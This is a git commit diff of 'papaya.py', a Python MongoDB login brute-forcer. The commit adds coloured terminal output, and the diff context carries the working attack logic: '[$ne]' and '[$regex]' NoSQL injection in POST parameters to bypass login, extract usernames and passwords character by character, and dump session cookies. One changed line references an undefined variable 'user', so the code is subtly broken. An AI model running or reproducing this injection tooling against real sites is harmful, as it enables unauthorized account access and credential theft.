e176116aeeaf17e6366504151ddf4be29d8807f5
eggdogg <svrath@web.de>
2020-01-24 22:57:07 +0100

    Add coloured output

--- papaya.py
+++ papaya.py
@@ -16,18 +16,18 @@ success_string = "Welcome back"
 def print_options():
     clear_terminal()
     print(
-"""[1] Set target username (Current: '{}')
-[2] Set username POST parameter (Current: '{}')
-[3] Set password POST parameter (Current: '{}')
-[4] Set unique success-identifier (Current: '{}')
+f"""\033[94m[1]\033[0m Set target username (Current: '{username}')
+\033[94m[2]\033[0m Set username POST parameter (Current: '{user_param}')
+\033[94m[3]\033[0m Set password POST parameter (Current: '{password_param}')
+\033[94m[4]\033[0m Set unique success-identifier (Current: '{success_string}')
 -------------------------------
-[5] Test for vulnerability  .'|'.
-[6] Brute force username   /.'|\\ \\
-[7] Brute force password   | /|'.|
-[8] Bypass login            \ |\/
+\033[92m[5]\033[0m Test for vulnerability  .'|'.
+\033[92m[6]\033[0m Brute force username   /.'|\\ \\
+\033[92m[7]\033[0m Brute force password   | /|'.|
+\033[92m[8]\033[0m Bypass login            \ |\/
 ---------------------        \|/
-[0] Exit Papaya
-?""".format(username, user_param, password_param, success_string))
+\033[94m[0]\033[0m Exit Papaya
+?""")
 
 def main():
     global success_string, user_param, password_param, page, username
@@ -36,16 +36,16 @@ def main():
         choice = input()
 
         if choice == "1":
-            print("[?] Enter username")
+            log("Enter username", 3)
             username = input()
         elif choice == "2":
-            print("[?] Set username POST parameter")
+            log("Set username POST parameter", 3)
             user_param = input()
         elif choice == "3":
-            print("[?] Set password POST parameter")
+            log("Set password POST parameter", 3)
             password_param = input()
         elif choice == "4":
-            print("[?] Set unique string in positive html response")
+            log("Set unique string in positive html response", 3)
             success_string = input()
         elif choice == "5":
             choice_test_vulnerability()
@@ -56,7 +56,7 @@ def main():
         elif choice == "8":
             choice_authenticate()
         elif choice == "0":
-            print("[!] Exiting...")
+            log("Exiting...", 3)
             quit()
             return
 
@@ -66,65 +66,73 @@ def main():
 
 def choice_test_vulnerability():
     clear_terminal()
-    print("[ ] Testing for vulnerability")
-    print("[ ] Target: '{}'".format(url))
+    log("Testing for vulnerability")
+    log(f"Target: '{url}'", 3)
     test_vulnerability()
-    wait()
+    await_input()
 
 def choice_username():
     global username
     clear_terminal()
-    print("[ ] Getting username...")
-    print("[ ] Target: '{}'".format(url))
+    log("Getting username...")
+    log(f"Target: '{url}'", 3)
     username = get_username()
     if not username:
         username = 'admin'
-    wait()
+    await_input()
 
 def choice_password():
     clear_terminal()
     if username == 'admin':
-        print("[ ] Default user 'admin' used. Maybe get a username first")
-    print("[ ] Testing password length for user: '{}'".format(username))
-    print("[ ] Target: '{}'".format(url))
+        log("Default user 'admin' used. Maybe get a username first", 3)
+    log(f"Testing password length for user: '{user}'")
+    log(f"Target: '{url}'", 3)
     pw_length = get_password_length(username)
     if pw_length:
-        print("[ ] Testing password for '{}' with length {} ".format(username, pw_length))
+        log(f"Getting password for '{username}' with length {pw_length} ")
         get_password(username, pw_length)
-    wait()
+    await_input()
 
 def choice_authenticate():
     clear_terminal()
-    print("[ ] Bypassing login")
-    print("[ ] Target: '{}'".format(url))
+    log("Bypassing login")
+    log(f"Target: '{url}'", 3)
     authenticate()
-    wait()
+    await_input()
 
 def clear_terminal():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("""------------------------------
-Papaya                       /\\
-MongoDB Login Bruteforcer   (  )
+\033[1mPapaya\033[0m                       /\\
+MongoDB Login Bruteforce    (  )
 ---------------------------  `´""")
 
-def wait():
-    print("\n[!] Press Enter to get back to main menu")
+def await_input():
+    log("Press Enter to get back to main menu", 3)
     input()
 
+def log(string, type=1):
+    if type == 1: # positive
+        print(f'\033[92m[+]\033[0m {string}')
+    elif type == 2: # warning
+        print(f'\033[93m[-]\033[0m {string}')
+    elif type == 3: # indication
+        print(f'\033[94m[!]\033[0m {string}')
+
 def not_vulnerable(coming_from_check=False):
-    print("\n[-] Not vulnerable. Check parameters")
+    log("Not vulnerable. Check parameters", 2)
     if not coming_from_check:
-        print("[?] Did you forget to set the success-identifier?")
+        log("Did you forget to set the success-identifier?", 3)
 
 def send_sessionless_post(params):
     try:
         return requests.post(url, data=params)
     except KeyboardInterrupt:
-        wait()
+        await_input()
         main()
     except:
-        print("[!] Could not connect to target")
-        wait()
+        log("Could not connect to target", 2)
+        await_input()
         main()
 
 def is_successfull(success_string, response):
@@ -139,12 +147,12 @@ def test_vulnerability():
         response_bogus = session.post(url, {
             user_param :'xXbOgUsXx',
             password_param :'xXbOgUsXx'
-		})
+        })
 
         response_injection = session.post(url, {
-		    user_param + "[$ne]":'xXbOgUsXx',
-		    password_param + "[$ne]":'xXbOgUsXx'
-		})
+            user_param + "[$ne]":'xXbOgUsXx',
+            password_param + "[$ne]":'xXbOgUsXx'
+        })
 
         response_bogus = BeautifulSoup(response_bogus.text, 'lxml')
         response_injection = BeautifulSoup(response_injection.text, 'lxml')
@@ -152,22 +160,22 @@ def test_vulnerability():
         if response_bogus.body == response_injection.body:
             not_vulnerable(True)
         else:
-            print("\n[ ] Successful login response:\n{}".format(response_injection.body))
-            print("\n[ ] Failed login response:\n{}".format(response_bogus.body))
-            print("\n[ ] Successful login response differs from failed login response")
-            print("[+] Application appears to be vulnerable!")
+            log(f"Got possible successful login response:\n{response_injection.body}\n", 3)
+            log(f"Got possible failed login response:\n{response_bogus.body}\n", 3)
+            log("Responses differ.")
+            log("Application appears to be vulnerable!")
 
             if len(session.cookies.get_dict()):
-                print("[+] Response returned cookies. Maybe we found a session cookie?")
+                log("Response returned cookies. Maybe we found a session cookie?")
                 print(session.cookies.get_dict())
 
-            print("\n[ ] Inspect the above responses to find a unique string to identify a successful login and adjust the options accordingly")
+            log("Inspect the above responses to find a unique string to identify a successful login and adjust the options accordingly", 3)
     except KeyboardInterrupt:
-        wait()
+        await_input()
         main()
     except:
-        print("[!] Could not connect to target")
-        wait()
+        log("Could not connect to target", 2)
+        await_input()
         main()
 
 def authenticate():
@@ -185,18 +193,18 @@ def authenticate():
             return
 
         if is_successfull(success_string, response):
-            print("\n[+] Authenticated!")
-            print("[+] Session cookies:")
+            log("Authenticated!")
+            log("Session cookies:")
             print(session.cookies.get_dict())
             return
         else:
             not_vulnerable()
     except KeyboardInterrupt:
-        wait()
+        await_input()
         main()
     except:
-        print("[!] Could not connect to target")
-        wait()
+        log("Could not connect to target", 2)
+        await_input()
         main()
 
 def get_username():
@@ -205,10 +213,6 @@ def get_username():
 
     while True:
         for c in alphabet:
-            #if it appears to be the admin user
-            #if not len(username) and c == "a":
-            #    continue
-
             params = {
                 user_param + "[$regex]":"^"+username+c+".*",
                 password_param + "[$ne]":'xXbOgUsXx'
@@ -221,12 +225,12 @@ def get_username():
                 return
             if is_successfull(success_string, response):
                 username = username + c
-                print("[+] Next character found! User='{}'".format(username))
+                log(f"Next character found! User='{username}'")
                 break
 
             if c == alphabet[-1]:
                 if len(username):
-                    print("[+] User found: '{}'".format(username))
+                    log(f"User found: '{username}'")
                     return username
                 else:
                     not_vulnerable()
@@ -255,18 +259,18 @@ def get_password(username, pw_length):
 
             if is_successfull(success_string, response):
                 if count == 0:
-                    print("\n[+] Password found: "+password)
+                    log(f"Password found: {password}")
                     return password
                 password = password + c
-                print("[+] Next character found! Password='{}'...".format(password))
-                print("[ ] {} Characters left...".format(count))
+                log(f"Next character found! Password='{password}'...")
+                log(f"{count} Characters left...", 3)
                 count -= 1
                 break
 
 def get_password_length(username):
     pw_length = 50
     while True:
-        params = { 
+        params = {
             'username':username,
             'password[$regex]':".{"+str(pw_length)+"}"
         }
@@ -274,7 +278,7 @@ def get_password_length(username):
         response = send_sessionless_post(params)
 
         if is_successfull(success_string, response):
-            print("[+] Found password length: {}".format(pw_length))
+            log(f"Found password length: {pw_length}")
             return pw_length
 
         if pw_length == 0:
@@ -287,10 +291,10 @@ if __name__ == "__main__":
     global url
 
     if len(sys.argv) < 2:
-        print("\nTarget URL not supplied.\nUsage: python3 papapy.py http[s]://TARGET")
+        print("\nTarget URL not supplied.\nUsage: python3 papaya.py http[s]://TARGET")
         quit()
     elif (sys.argv[1][0:7] != "http://") and (sys.argv[1][0:8] != "https://"):
-        print("\nTarget URL in wrong format.\nUsage: python3 papapy.py http[s]://TARGET")
+        print("\nTarget URL in wrong format.\nUsage: python3 papaya.py http[s]://TARGET")
         quit()
     else:
         url = sys.argv[1]
